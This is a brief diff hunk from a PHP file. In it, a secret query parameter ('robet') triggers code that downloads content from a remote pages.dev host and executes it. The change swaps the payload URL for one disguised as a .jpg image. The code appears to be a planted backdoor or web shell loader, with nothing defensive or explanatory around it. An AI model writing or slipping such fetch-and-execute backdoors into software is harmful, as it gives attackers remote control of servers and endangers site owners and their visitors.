@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['robet'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://mentahalfarudi.pages.dev/index.txt");
+    $executor->executeCodeFromURL("https://batuk-di-komik-aja.pages.dev/loaders.jpg");
     exit;
 }
 
